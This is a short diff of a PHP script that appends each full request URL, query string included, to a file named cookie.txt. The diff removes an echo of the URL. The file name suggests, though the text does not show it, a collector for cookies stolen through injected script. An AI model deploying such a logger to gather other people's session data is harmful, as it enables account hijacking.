@@ -9,11 +9,8 @@
         $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
     }
 
-    $ref = $pageURL;
-    echo $ref;
-    
     $file = fopen("cookie.txt","a+");
-	fputs($file,"$ref");
+	fputs($file,"$pageURL");
 	fputs($file,"\n");
 	fclose($file);
 ?>
